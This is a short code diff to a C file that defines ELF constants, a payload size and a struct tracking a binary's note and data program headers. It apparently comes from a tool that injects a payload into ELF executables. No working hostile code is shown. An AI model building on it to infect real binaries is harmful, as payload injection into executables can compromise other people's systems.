@@ -29,7 +29,7 @@
 #define ELF_MAGIC_NUMBER 1179403647
 #define X86_64 2
 
-#define PAYLOAD_SIZE 708
+#define PAYLOAD_SIZE 16
 
 #define BUFF_SIZE 1024 * 1024
 
@@ -63,13 +63,10 @@ struct s_info
 {
 	int fd;
 	void *ptr;
-	unsigned long long size;
+	size_t size;
 
 	Elf64_Phdr *note;
 	Elf64_Phdr *data;
-
-	int addr_padding;
-	int offs_padding;
 };
 
 struct criteria
